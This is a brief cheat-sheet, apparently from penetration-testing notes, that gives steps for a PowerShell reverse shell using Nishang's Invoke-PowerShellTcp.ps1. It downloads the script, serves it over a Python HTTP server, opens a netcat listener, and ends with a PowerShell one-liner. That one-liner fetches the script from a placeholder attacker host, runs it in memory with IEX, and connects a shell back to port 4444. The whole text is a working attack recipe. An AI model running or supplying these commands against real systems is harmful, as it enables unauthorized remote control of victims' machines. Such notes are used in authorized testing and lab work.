
---
[Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) from [Nishang](https://github.com/samratashok/nishang)
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -q
```

```bash
python3 -m http.server 8000
```

```bash
nc -lvnp 4444
```

```powershell
powershell -c IEX(New-Object NET.WebClient).DownloadString('http://[Attack_Host_Ip]:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [Attacl_Host_Ip] -Port 4444
```
